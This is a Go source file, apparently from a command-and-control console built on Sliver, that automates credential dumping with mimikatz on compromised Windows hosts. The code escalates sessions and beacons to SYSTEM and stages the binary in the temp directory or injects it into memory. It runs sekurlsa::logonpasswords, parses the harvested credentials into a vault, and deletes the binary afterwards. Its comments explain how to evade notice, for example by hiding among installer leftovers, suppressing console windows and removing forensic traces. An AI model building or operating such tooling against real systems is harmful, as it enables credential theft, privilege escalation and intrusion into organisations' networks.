package sliver

import (
	"errors"
	"fmt"
	"strings"
	"time"

	"c2tool/internal/embed"
)

// mimikatzTimeout bounds a credential run. The generic Execute helper caps out
// at two minutes, which is not enough for lsadump::sam or a dcsync against a
// slow domain controller; a truncated run would look like an empty result
// rather than a failure, and the operator would conclude the host had no
// credentials worth stealing.
const mimikatzTimeout = 10 * time.Minute

// DefaultMimikatzCommand is the sweep that finds the most.
const DefaultMimikatzCommand = "sekurlsa::logonpasswords"

// mimikatzTargetPath is where the binary is written on the target.
//
// The temp directory is asked for rather than assumed. %TEMP% is per-user and
// writable, and a payload dropped there sits among every other installer's
// leftovers instead of standing out. C:\Windows\Temp is the fallback because it
// is the one location that stays writable when the session has no profile
// loaded -- a service context, or a token from a user who never logged on
// interactively.
func (c *Client) mimikatzTargetPath(sessionID string) string {
	dir := c.envValue(sessionID, "TEMP")
	if dir == "" {
		dir = c.envValue(sessionID, "TMP")
	}
	if dir == "" {
		dir = `C:\Windows\Temp`
	}
	return strings.TrimRight(dir, `\/`) + `\` + embed.MimikatzName
}

// envValue reads one environment variable from the target. A failure is not an
// error here: the caller has a fallback, and a session that cannot report its
// environment still deserves a harvest attempt.
func (c *Client) envValue(sessionID, name string) string {
	vars, err := c.GetEnv(sessionID)
	if err != nil {
		return ""
	}
	for _, v := range vars {
		if strings.EqualFold(v.Key, name) {
			return strings.TrimSpace(v.Value)
		}
	}
	return ""
}

// MimikatzRequest describes one credential-harvesting run.
type MimikatzRequest struct {
	Command string `json:"command"`
	Upload  []byte `json:"-"`
	AutoAdd bool   `json:"autoAdd"`
	// Elevate escalates to SYSTEM before running when the session's token is
	// not already elevated. Pointer so the zero value means "the caller did not
	// say", which the handler resolves to on -- the modules that need it are the
	// ones an operator reaches for, and failing with an access-denied they have
	// to interpret is worse than one extra step that reports what it did.
	Elevate *bool `json:"elevate"`
	// HostingProcess is the SYSTEM process the escalation injects into. Empty
	// lets sliver choose from its built-in list.
	HostingProcess string `json:"hostingProcess"`
	// Mode selects how the payload reaches the target: auto, memory or upload.
	// Empty means auto, which is what a client that predates this field sends.
	Mode string `json:"mode"`
	// Process is the sacrificial process a memory-mode run is injected into.
	// Empty uses the console's default. It is a path, not a pid: Sliver's
	// sideload starts this process rather than injecting into a running one.
	Process string `json:"process"`
}

// MimikatzResult is the JSON shape returned to the console.
type MimikatzResult struct {
	OK       bool               `json:"ok"`
	Command  string             `json:"command"`
	Raw      string             `json:"raw"`
	ExitCode uint32             `json:"exitCode"`
	Parsed   []ParsedCredential `json:"parsed"`
	Added    int                `json:"added"`
	Message  string             `json:"message"`
	// Elevated reports that the run was escalated to a SYSTEM session first.
	Elevated bool `json:"elevated"`
	// SessionID is the session the command actually ran on. It differs from the
	// requested one when escalation produced a new SYSTEM session.
	SessionID string `json:"sessionId"`
	// Integrity is the token integrity observed before the run, when it could be
	// read. "Medium" is the answer that explains an LSA access-denied.
	Integrity string `json:"integrity"`
	// Mode is the route the payload actually took. It can differ from the one
	// requested: auto falls back to a disk write when the payload cannot be
	// injected, and the operator needs to see that it did.
	Mode string `json:"mode,omitempty"`
	// TargetPath is the file written on the target. Empty on an in-memory run.
	TargetPath string `json:"targetPath,omitempty"`
	// Execution describes what ran before the payload started -- which host
	// process, or why the disk path was used instead. Shown beside the
	// credentials so a run is auditable without reading the raw output.
	Execution string `json:"execution,omitempty"`
}

// escalationWait bounds how long a mimikatz run waits for the SYSTEM implant
// that GetSystem spawns to check in. It is generous because the new implant has
// to start, call back and register, and a slow link is not a failure.
const escalationWait = 60 * time.Second

// harvestTarget names the thing a credential run is aimed at.
//
// It exists because a beacon and a session reach the same operations by
// different routes -- the beacon's calls carry Async and BeaconID, the session's
// carry nothing special -- and the previous code only knew how to speak to a
// session. A beacon then fell through the escalation step entirely, silently.
type harvestTarget struct {
	// SessionID is set for an interactive session.
	SessionID string
	// BeaconID is set for a beacon.
	BeaconID string
}

func (t harvestTarget) isBeacon() bool { return t.BeaconID != "" && t.SessionID == "" }

// String names the target for a message. It prints the ID because an operator
// with several targets open needs to know which one a note is about.
func (t harvestTarget) String() string {
	if t.isBeacon() {
		return "beacon " + t.BeaconID
	}
	return "session " + t.SessionID
}

// SessionTarget names an interactive session.
func SessionTarget(sessionID string) harvestTarget {
	return harvestTarget{SessionID: sessionID}
}

// BeaconTarget names a beacon.
func BeaconTarget(beaconID string) harvestTarget {
	return harvestTarget{BeaconID: beaconID}
}

// ResolveTarget works out whether id names a session or a beacon, by asking the
// server which table it is in.
//
// Looked up rather than inferred from the string: Sliver does not promise the
// two ID spaces are distinguishable by shape, and guessing wrong would point a
// credential harvest at the wrong host.
func (c *Client) ResolveTarget(id string) (harvestTarget, error) {
	if id == "" {
		return harvestTarget{}, errNoIntegritySource
	}
	if sessions, err := c.Sessions(); err == nil {
		for _, s := range sessions {
			if s.ID == id {
				return harvestTarget{SessionID: id}, nil
			}
		}
	}
	if beacons, err := c.Beacons(); err == nil {
		for _, b := range beacons {
			if b.ID == id {
				return harvestTarget{BeaconID: id}, nil
			}
		}
	}
	return harvestTarget{}, fmt.Errorf("no session or beacon has id %q", id)
}

// escalateForMimikatz checks the session's token and, when it is not elevated,
// escalates to SYSTEM before the credential run.
//
// It writes what it learned into result and returns a note describing an outcome
// the operator needs to see. The return value is empty when there is nothing
// worth saying (already elevated, or the integrity could not be read and the run
// should simply proceed).
//
// The integrity read is the only reliable signal here. A medium-integrity token
// on an administrator account looks privileged in every other respect -- the
// username, the group list, `whoami /groups` -- and still cannot open LSASS,
// which is exactly the confusion this removes.
func (c *Client) escalateForMimikatz(target harvestTarget, hostingProcess string, result *MimikatzResult) string {
	level, err := c.targetIntegrity(target)
	if err != nil {
		// This used to return "" and say nothing, on the reasoning that a failure
		// here is not the run's fault. That was wrong in the way that matters:
		// the failure was guaranteed on a beacon, and staying quiet turned a
		// missing code path into a diagnosis about the operator's token. The run
		// still proceeds -- best-effort has not changed -- but it now says which
		// step was skipped and why.
		return fmt.Sprintf(
			"could not read the token integrity of %s (%v), so escalation to SYSTEM was "+
				"skipped. If the run below reports an LSA access-denied, that is why: the "+
				"payload ran on the original token. vault::cred and dpapi::cred do not need "+
				"elevation and work either way",
			target, err)
	}
	result.Integrity = level

	if IsElevatedIntegrity(level) {
		return ""
	}

	newID, err := c.targetElevateToSystem(target, hostingProcess, escalationWait)
	if err != nil {
		return fmt.Sprintf(
			"this %s's token is at %s integrity, which cannot open LSASS, and escalating to "+
				"SYSTEM failed (%v). Running anyway so the raw output is visible; the modules "+
				"that work without elevation are vault::cred and dpapi::cred",
			targetKind(target), level, err)
	}

	result.Elevated = true
	result.SessionID = newID
	return fmt.Sprintf("escalated from %s integrity to a SYSTEM session", level)
}

// targetKind names the target for a message, without the ID.
func targetKind(t harvestTarget) string {
	if t.isBeacon() {
		return "beacon"
	}
	return "session"
}

// targetIntegrity reads the token integrity of whichever target this is.
//
// The two directions are not variations on one call. GetPrivs resolves a
// SessionID through the server's session table, and a beacon is not in that
// table -- which is why asking on a beacon's behalf with a session-shaped
// request returns InvalidSessionID every time.
func (c *Client) targetIntegrity(t harvestTarget) (string, error) {
	if t.isBeacon() {
		return c.BeaconIntegrity(t.BeaconID, beaconIntegrityWait)
	}
	if t.SessionID == "" {
		return "", errNoIntegritySource
	}
	return c.SessionIntegrity(t.SessionID)
}

// targetElevateToSystem runs GetSystem against whichever target this is.
func (c *Client) targetElevateToSystem(t harvestTarget, hostingProcess string, wait time.Duration) (string, error) {
	if t.isBeacon() {
		return c.BeaconElevateToSystem(t.BeaconID, hostingProcess, wait)
	}
	if t.SessionID == "" {
		return "", errNoIntegritySource
	}
	return c.ElevateToSystem(t.SessionID, hostingProcess, wait)
}

// beaconIntegrityWait bounds the wait for a beacon to answer GetPrivs.
//
// Longer than a session's because a beacon only acts on its next check-in: at a
// sixty-second sleep interval the answer is a minute away by construction, and
// timing out before that would report "beacon did not answer" for a beacon that
// was going to.
const beaconIntegrityWait = 3 * time.Minute

// executeWithTimeout runs the mimikatz command with a caller-chosen deadline and
// a request timeout the server will honour.
//
// It delegates to execOn for the same reason every other spawn does: a Windows
// target must be started through the ExecuteWindows RPC, or the console window
// that appears on the desktop announces the run. mimikatz is the last thing an
// operator wants a window attached to.
func (c *Client) executeWithTimeout(sessionID, path string, args []string, op time.Duration) (*ExecResult, error) {
	return c.execOn(sessionID, "", path, args, op)
}

// MimikatzRun executes a credential-dumping command, parses the output, and
// optionally imports what it found.
//
// The payload reaches the target one of two ways, chosen by req.Mode: written to
// the target's temp directory and executed, or injected into a host process
// without ever touching the disk. The in-memory routes live in mimikatz_memory.go
// because that path has its own rules about when refusal is the right answer.
// MimikatzRun executes a credential-dumping command, parses the output, and
// optionally imports what it found.
//
// target is a session or a beacon. Both are accepted because the operator's
// intent is the same on either, and refusing the beacon case is what left the
// escalation step un-run for beacon operators.
func (c *Client) MimikatzRun(target harvestTarget, req MimikatzRequest, originUUID string) (*MimikatzResult, error) {
	sessionID := target.SessionID
	if target.isBeacon() {
		// A beacon has no session ID at all; the field is only used to stamp the
		// result, and stamping it with the beacon ID is what makes the run
		// traceable back to the host it came from.
		sessionID = target.BeaconID
	}
	command := strings.TrimSpace(req.Command)
	if command == "" {
		command = DefaultMimikatzCommand
	}
	mode := normalizeMimikatzMode(req.Mode)
	// An empty Upload means "use the tool this console ships". A non-empty one is
	// a payload the operator supplied, which changes which in-memory loaders can
	// apply, so the distinction is carried into the run rather than flattened.
	custom := len(req.Upload) > 0
	payload := req.Upload
	if !custom {
		payload = embed.Mimikatz
	}
	if len(payload) == 0 {
		return nil, errors.New("this build carries no mimikatz binary")
	}

	result := &MimikatzResult{Command: command, SessionID: sessionID}

	// Escalate before uploading or running anything. The check has to happen
	// first: the failure it prevents is an access-denied from inside mimikatz,
	// which the operator only sees after waiting out a ten-minute timeout, and
	// which looks like a broken tool rather than an unelevated token.
	//
	// Elevation is best-effort. If it fails -- the token has no SeDebugPrivilege
	// to inject with, or the host has no suitable SYSTEM process -- the run still
	// proceeds on the original session and the result says so. Refusing to try
	// would be worse than trying and reporting.
	var escalationNote string
	// runOn is where the payload actually goes. Escalation can move it: GetSystem
	// produces a NEW session rather than elevating the current one, so a
	// successful escalation redirects every later step there. The parameter is
	// left alone so the result still names what the operator asked for.
	runOn := target
	if req.Elevate == nil || *req.Elevate {
		escalationNote = c.escalateForMimikatz(target, req.HostingProcess, result)
		if result.Elevated {
			runOn = harvestTarget{SessionID: result.SessionID}
		}
	}
	if runOn.SessionID == "" {
		// Escalation did not move us and the target is still a beacon. The
		// execution paths need a session: Sideload, Upload and Execute all
		// resolve their target through the session table. Saying so is the point
		// of this rework -- the previous code reached the same conclusion and
		// reported it as an unelevated token.
		return nil, fmt.Errorf(
			"credential harvesting needs an interactive session, and this target is a %s "+
				"whose escalation did not produce one. Open an interactive session from it "+
				"(the console's beacon view has that action) and run the harvest there",
			targetKind(target))
	}

	// --- Execution ---------------------------------------------------------
	//
	// The in-memory route is attempted for every mode except an explicit upload.
	// Auto falls back to the disk path when the payload cannot be injected; an
	// explicit memory request is refused instead, because silently writing a
	// file answers a question the operator did not ask.
	var executionNote string
	if mode != MimikatzModeUpload {
		raw, note, err := c.runMimikatzInMemory(runOn.SessionID, command, payload, custom, req.Process)
		if err != nil {
			if mode == MimikatzModeMemory {
				return nil, err
			}
			executionNote = "内存加载不可用，已回退到上传执行（" + err.Error() + "）"
			mode = MimikatzModeUpload
		} else {
			result.Mode = MimikatzModeMemory
			result.Execution = note
			result.Raw = raw
			result.Parsed = ParseMimikatz(result.Raw, command)
		}
	}

	if mode == MimikatzModeUpload {
		// Stage after escalating, not before: the temp directory is per-session,
		// so a run that escalates to SYSTEM must write into SYSTEM's temp rather
		// than the original user's. Writing first would leave the binary in a
		// directory the elevated process may not be able to read, which surfaces
		// as a launch failure that looks like a broken payload.
		path := c.mimikatzTargetPath(runOn.SessionID)
		if err := c.Upload(runOn.SessionID, path, payload); err != nil {
			return nil, fmt.Errorf("upload %s: %w", path, err)
		}
		// "exit" keeps the tool from dropping into its interactive prompt, which
		// would hold the pipe open until the timeout instead of returning output.
		out, err := c.executeWithTimeout(runOn.SessionID, path, []string{command, "exit"}, mimikatzTimeout)
		if err != nil {
			return nil, err
		}
		result.Mode = MimikatzModeUpload
		result.TargetPath = path
		result.ExitCode = out.Status
		result.Raw = strings.TrimSpace(out.Stdout + "\n" + out.Stderr)
		result.Parsed = ParseMimikatz(result.Raw, command)

		// The binary is removed once it has run. A temp directory is not a hiding
		// place: leaving it there means the next person to list %TEMP% finds the
		// tool that was used against the host.
		if note := c.cleanupStagedFile(runOn.SessionID, path); note != "" {
			executionNote = note
		}
	}

	if executionNote != "" {
		result.Execution = strings.TrimSpace(result.Execution + " " + executionNote)
	}

	if req.AutoAdd {
		added, err := c.MimikatzImport(result.Parsed, originUUID)
		if err != nil {
			// The harvest itself succeeded, so report the credentials and the
			// import failure together rather than discarding usable output.
			result.OK = true
			result.Added = 0
			result.Message = fmt.Sprintf("parsed %d credential(s) but could not add them to the vault: %v",
				len(result.Parsed), err)
			return result, nil
		}
		result.Added = added
	}
	result.OK = true
	switch {
	case len(result.Parsed) == 0:
		result.Message = diagnoseMimikatzFailure(result.Raw, command)
	case req.AutoAdd:
		result.Message = fmt.Sprintf("parsed %d credential(s), %d new to the vault", len(result.Parsed), result.Added)
	default:
		result.Message = fmt.Sprintf("parsed %d credential(s)", len(result.Parsed))
	}

	// Say what the escalation did. A run that silently produced a second session
	// leaves the operator with two entries in the list and no explanation, and a
	// run that could not escalate has to explain why the output is an
	// access-denied.
	if escalationNote != "" {
		result.Message = escalationNote + "; " + result.Message
	}
	return result, nil
}

// diagnoseMimikatzFailure turns mimikatz's terse error codes into the reason and
// the module that would work instead.
//
// "no credentials were parsed" is the least useful thing to tell an operator:
// the same message covers "the tool ran fine and this host has no secrets" and
// "the token is not elevated, so the module could not open LSA at all". Those
// call for opposite next steps, and the raw output already says which one it is.
func diagnoseMimikatzFailure(raw, command string) string {
	low := strings.ToLower(raw)

	switch {
	case strings.Contains(low, "kuhl_m_sekurlsa_acquirelsa") || strings.Contains(low, "0x00000005"):
		return "no credentials parsed: LSA access was denied. sekurlsa reads live logon sessions " +
			"and needs an elevated token; this session's token is not elevated. vault::cred and " +
			"dpapi::cred run as the current user and work without it."

	case strings.Contains(low, "rtladjustprivilege") || strings.Contains(low, "c0000061"):
		return "no credentials parsed: privilege::debug failed with STATUS_PRIVILEGE_NOT_HELD " +
			"(0xc0000061). The token lacks SeDebugPrivilege, so the sekurlsa and lsadump modules " +
			"cannot run. vault::cred does not need it."

	case strings.Contains(low, "kuhl_m_lsadump_sam"):
		return "no credentials parsed: the SAM hive could not be read. lsadump::sam needs " +
			"administrator rights; without them the hive is unreadable."

	case strings.Contains(low, "credential guard"):
		return "no credentials parsed: Credential Guard is running on this host. Even with " +
			"administrator rights, sekurlsa cannot read the isolated LSA secrets here."

	case strings.Contains(low, "is not recognized") || strings.Contains(low, "unknown command") ||
		strings.Contains(low, "unknown module") || strings.Contains(low, "command not found"):
		return fmt.Sprintf("no credentials parsed: mimikatz did not recognise %q. Check the module "+
			"name and the build.", command)

	case strings.Contains(low, "the system cannot find the file") || strings.Contains(low, "no such file"):
		return "no credentials parsed: the mimikatz binary is not at the configured path on the target."

	case strings.Contains(low, "bye!"):
		return "mimikatz ran, but this command produced no credentials. The host may genuinely hold " +
			"none for this module; try another, or read the raw output below."

	case raw == "":
		return "the command returned no output at all. The binary may have been blocked by AV " +
			"before it could print, or the path is wrong."
	}

	return "command completed but no credentials were parsed; the output format was not " +
		"recognised. Check the raw output below."
}
